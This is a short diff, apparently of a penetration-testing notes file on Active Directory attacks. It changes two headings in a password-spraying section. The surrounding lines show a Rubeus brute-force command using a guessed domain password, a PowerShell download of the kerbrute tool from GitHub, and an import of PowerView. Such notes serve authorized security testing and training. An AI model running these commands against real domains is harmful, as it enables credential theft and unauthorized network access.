@@ -35,10 +35,10 @@ function Test-ADCredential {
 
 # 2. Password Spraying
 ## Identify the standard domain password and start a password spray attack
-### Use Rubeus
+### Rubeus
 `PS> .\Rubeus.exe brute /password:Start123!`
 
-### Use Kerbrute
+### Kerbrute
 `PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"`
 
 `PS> Import-Module .\PowerView.ps1`
